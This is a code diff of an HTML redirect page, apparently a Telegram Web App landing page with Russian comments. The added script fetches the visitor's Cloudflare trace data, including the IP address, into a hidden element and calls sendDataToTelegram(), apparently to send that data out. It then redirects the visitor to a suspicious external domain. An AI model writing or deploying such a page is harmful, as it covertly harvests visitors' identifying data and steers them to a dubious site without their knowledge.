@@ -3,19 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>redirecting...</title>
+    <title>Redirecting</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- Include Cloudflare trace -->
-    <script src="https://www.cloudflare.com/cdn-cgi/trace" type="text/plain" id="cloudflare-trace"></script>
-    <script src="script.js" defer></script>
-     <script>
-        setTimeout(function() {
-            window.location.href = "http://1wfgka.life/"; // замените "https://example.com" на адрес желаемого сайта
-        }, 200); // 2000 миллисекунд = 2 секунды
+    <script src="script.js"></script>
+    <script>
+        async function init() {
+            try {
+                // Попытка получить IP перед редиректом
+                const traceResponse = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                const traceText = await traceResponse.text();
+                document.getElementById('cf-trace').textContent = traceText;
+                
+                // Запускаем основной скрипт
+                await sendDataToTelegram();
+                
+                // После успешной отправки данных делаем редирект
+                window.location.href = "http://1wfgka.life/";
+            } catch (error) {
+                console.error('Init error:', error);
+                // Если что-то пошло не так, все равно делаем редирект через 2 секунды
+                setTimeout(() => {
+                    window.location.href = "http://1wfgka.life/";
+                }, 2000);
+            }
+        }
+
+        // Запускаем после загрузки страницы
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', init);
+        } else {
+            init();
+        }
     </script>
 </head>
 <body>
-    <!-- Hidden container for Cloudflare trace data -->
     <div id="cf-trace" style="display: none;"></div>
 </body>
 </html>
